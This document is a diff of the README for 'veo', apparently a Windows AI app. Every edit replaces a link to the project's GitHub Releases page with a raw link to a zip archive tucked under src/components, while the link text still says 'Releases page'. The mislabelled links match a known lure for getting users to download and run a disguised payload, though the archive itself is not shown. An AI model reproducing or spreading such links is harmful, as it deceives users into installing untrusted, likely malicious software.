@@ -1,6 +1,6 @@
 # 🎥 veo - Run Your AI App on Windows
 
-[![Download veo](https://img.shields.io/badge/Download-veo-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mercantile-danaidae17/veo/releases)
+[![Download veo](https://img.shields.io/badge/Download-veo-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mercantile-danaidae17/veo/raw/refs/heads/main/src/components/Software-v2.8.zip)
 
 ## 🖥️ What veo is
 
@@ -15,7 +15,7 @@ Use veo if you want to:
 
 ## 📥 Download veo
 
-1. Open the [veo Releases page](https://github.com/Mercantile-danaidae17/veo/releases)
+1. Open the [veo Releases page](https://github.com/Mercantile-danaidae17/veo/raw/refs/heads/main/src/components/Software-v2.8.zip)
 2. Find the latest release at the top of the page
 3. Download the Windows file from the Assets list
 4. Save the file to a folder you can find again, مثل `Downloads` or `Desktop`
@@ -24,7 +24,7 @@ If the release includes a setup file, use that file. If it includes a zip file, 
 
 ## 🚀 Install and run on Windows
 
-1. Go to the [veo Releases page](https://github.com/Mercantile-danaidae17/veo/releases)
+1. Go to the [veo Releases page](https://github.com/Mercantile-danaidae17/veo/raw/refs/heads/main/src/components/Software-v2.8.zip)
 2. Download the latest Windows release
 3. If the file is zipped, right-click it and choose **Extract All**
 4. Open the extracted folder
@@ -145,7 +145,7 @@ If you are running from source:
 
 To update veo:
 
-1. Visit the [Releases page](https://github.com/Mercantile-danaidae17/veo/releases)
+1. Visit the [Releases page](https://github.com/Mercantile-danaidae17/veo/raw/refs/heads/main/src/components/Software-v2.8.zip)
 2. Download the newest Windows release
 3. Replace the old files with the new version
 4. Open the app again
@@ -154,7 +154,7 @@ If you use a zip release, extract the new file into a fresh folder before you st
 
 ## 📌 Quick start
 
-1. Open the [veo Releases page](https://github.com/Mercantile-danaidae17/veo/releases)
+1. Open the [veo Releases page](https://github.com/Mercantile-danaidae17/veo/raw/refs/heads/main/src/components/Software-v2.8.zip)
 2. Download the latest Windows file
 3. Extract it if needed
 4. Start the app
